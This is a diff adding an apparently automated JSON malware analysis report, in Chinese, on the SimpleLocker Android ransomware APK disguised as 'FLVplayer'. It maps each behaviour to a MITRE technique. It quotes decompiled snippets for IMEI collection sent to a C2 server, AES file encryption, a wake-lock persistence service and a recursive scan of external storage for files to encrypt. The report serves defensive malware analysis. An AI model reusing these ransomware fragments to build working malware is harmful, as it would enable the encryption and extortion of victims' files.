@@ -1,0 +1,152 @@
+{
+  "APK信息": {
+    "文件名": "41b4dbc8cb144145c9eea8b0e4c9c9da3102ff42500923067ba32a5acfcaa858.apk",
+    "sha256": "41b4dbc8cb144145c9eea8b0e4c9c9da3102ff42500923067ba32a5acfcaa858",
+    "包名": "org.simplelocker",
+    "应用名": "FLVplayer",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 104.7
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\simplelocker\\g;",
+          "method_signature": "if(sharedPreferences.getBoolean(\"STOP_POLLING\", false)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String deviceId = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();\njSONObject.put(\"device id\", deviceId != null ? deviceId.substring(0, Math.min(deviceId.length(), 10)) : \"\");\njSONObject.put(\"client number\", \"4\");\nnew Thread(new f(new e(jSONObject.toString(), context))).start();",
+          "malicious_code_snippet_context": "          try {\n              JSONObject jSONObject = new JSONObject();\n              jSONObject.put(\"type\", \"locker check\");\n>>>             String deviceId = ((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId();\n>>>             jSONObject.put(\"device id\", deviceId != null ? deviceId.substring(0, Math.min(deviceId.length(), 10)) : \"\");\n>>>             jSONObject.put(\"client number\", \"4\");\n>>>             new Thread(new f(new e(jSONObject.toString(), context))).start();\n          } catch (JSONException e) {\n              e.printStackTrace();\n          }",
+          "behavior_description": "该代码来自SimpleLocker勒索木马，通过TelephonyManager.getDeviceId()获取设备唯一标识符(IMEI)，截取前10位后封装为JSON对象（包含\"locker check\"类型和client编号），随后启动新线程将JSON数据发送至远程C2服务器。数据流向为：getDeviceId()→JSON封装→网络发送，属于典型的设备指纹采集并上报C2行为，用于勒索软件追踪受感染设备。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\simplelocker\\a;",
+          "method_signature": "a(String str, String str2)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.a = Cipher.getInstance(\"AES/CBC/PKCS7Padding\");\nthis.b = new SecretKeySpec(bArr, \"AES\");\nthis.c = new IvParameterSpec(new byte[16]);\nthis.a.init(1, this.b, this.c);\nCipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, this.a);\nbyte[] bArr = new byte[8];\nwhile (true) {\n    int read = fileInputStream.read(bArr);\n    if (read == -1) {\n        cipherOutputStream.flush();\n        cipherOutputStream.close();\n        fileInputStream.close();\n        return;\n    }\n}",
+          "malicious_code_snippet_context": "          messageDigest.update(str.getBytes(\"UTF-8\"));\n          byte[] bArr = new byte[32];\n          System.arraycopy(messageDigest.digest(), 0, bArr, 0, bArr.length);\n>>>         this.a = Cipher.getInstance(\"AES/CBC/PKCS7Padding\");\n>>>         this.b = new SecretKeySpec(bArr, \"AES\");\n>>>         this.c = new IvParameterSpec(new byte[16]);\n>>>     }\n>>> \n>>>     public final void a(String str, String str2) {\n>>>         FileInputStream fileInputStream = new FileInputStream(str);\n>>>         FileOutputStream fileOutputStream = new FileOutputStream(str2);\n>>>         this.a.init(1, this.b, this.c);\n>>>         CipherOutputStream cipherOutputStream = new CipherOutputStream(fileOutputStream, this.a);\n>>>         byte[] bArr = new byte[8];\n>>>         while (true) {\n>>>             int read = fileInputStream.read(bArr);\n>>>             if (read == -1) {\n>>>                 cipherOutputStream.flush();\n                  cipherOutputStream.close();\n                  fileInputStream.close();\n                  return;",
+          "behavior_description": "该代码使用 AES/CBC/PKCS7Padding 模式初始化加密器，密钥来自 MessageDigest 摘要的 32 字节，IV 为全零的 16 字节。方法 a(String str, String str2) 从源文件路径 str 读取数据（FileInputStream），通过 CipherOutputStream 以 AES 加密模式（mode=1 即 ENCRYPT_MODE）将数据加密后写入目标文件路径 str2（FileOutputStream）。这是典型的勒索软件文件加密行为，遍历读取用户文件并输出加密副本，导致用户文件无法正常访问。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\simplelocker\\DecryptService;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public class DecryptService extends Service {\n    private PowerManager.WakeLock b;\n    @Override\n    public void onCreate() {\n        a = true;\n        this.b = ((PowerManager) getSystemService(\"power\")).newWakeLock(1, \"WakeLock\");\n    }\n}",
+          "malicious_code_snippet_context": "  import android.os.PowerManager;\n  \n  /* loaded from: classes.dex */\n>>> public class DecryptService extends Service {\n>>>     public static boolean a = false;\n>>>     private PowerManager.WakeLock b;\n>>> \n>>>     @Override // android.app.Service\n>>>     public IBinder onBind(Intent intent) {\n>>>         return null;\n>>>     }\n  \n      @Override // android.app.Service\n      public void onCreate() {",
+          "behavior_description": "该代码属于已知勒索软件家族 simplelocker。DecryptService 在 onCreate 中通过 getSystemService(\"power\") 获取 PowerManager，再调用 newWakeLock(1, \"WakeLock\") 获取 PARTIAL_WAKE_LOCK 唤醒锁，使设备 CPU 在屏幕关闭后仍保持运行，确保勒索/加密进程持续在后台执行不被系统休眠中断。同时设置静态标志位 a=true 标记服务已启动，用于保活状态追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "file_access",
+      "中文名": "文件访问/窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_EXTERNAL_STORAGE",
+          "android.permission.WRITE_EXTERNAL_STORAGE"
+        ],
+        "字符串": [
+          "listFiles",
+          "getExternalStorageDirectory"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\simplelocker\\d;",
+          "method_signature": "for(File file2 : file.listFiles()",
+          "malicious_behavior": "file_access",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public d(Context context) {\n    this.d = context.getSharedPreferences(\"AppPrefs\", 0);\n    a(new File(Environment.getExternalStorageDirectory().toString()));\n}\n\nprivate void a(File file) {\n    for (File file2 : file.listFiles()) {\n        File file3 = new File(file.getAbsolutePath(), file2.getName());\n        if (!file3.isDirectory() || file3.listFiles() == null) {\n            String absolutePath = file3.getAbsolutePath();\n            String substring = absolutePath.substring(absolutePath.lastIndexOf(\".\") + 1);\n            if (this.c.contains(substring)) {\n                this.b.add(file3.getAbsolutePath());\n            } else if (b.a.contains(substring)) {\n                this.a.add(file3.getAbsolutePath());\n            }\n        } else {",
+          "malicious_code_snippet_context": "      private final List c = Arrays.asList(\"enc\");\n      private SharedPreferences d;\n  \n>>>     public d(Context context) {\n>>>         this.d = context.getSharedPreferences(\"AppPrefs\", 0);\n>>>         a(new File(Environment.getExternalStorageDirectory().toString()));\n>>>     }\n>>> \n>>>     private void a(File file) {\n>>>         for (File file2 : file.listFiles()) {\n>>>             File file3 = new File(file.getAbsolutePath(), file2.getName());\n>>>             if (!file3.isDirectory() || file3.listFiles() == null) {\n>>>                 String absolutePath = file3.getAbsolutePath();\n>>>                 String substring = absolutePath.substring(absolutePath.lastIndexOf(\".\") + 1);\n>>>                 if (this.c.contains(substring)) {\n>>>                     this.b.add(file3.getAbsolutePath());\n>>>                 } else if (b.a.contains(substring)) {\n>>>                     this.a.add(file3.getAbsolutePath());\n>>>                 }\n>>>             } else {\n                  a(file3);\n              }\n          }",
+          "behavior_description": "该代码属于 SimpleLocker 勒索软件家族。构造函数从外部存储根目录开始递归遍历整个文件系统，收集所有文件的扩展名，将已加密文件(.enc)路径收集到列表b中，将待加密文件路径收集到列表a中，为后续的文件加密（勒索）操作做准备。数据流向：Environment.getExternalStorageDirectory()→递归listFiles()遍历→按扩展名分类收集文件路径列表",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
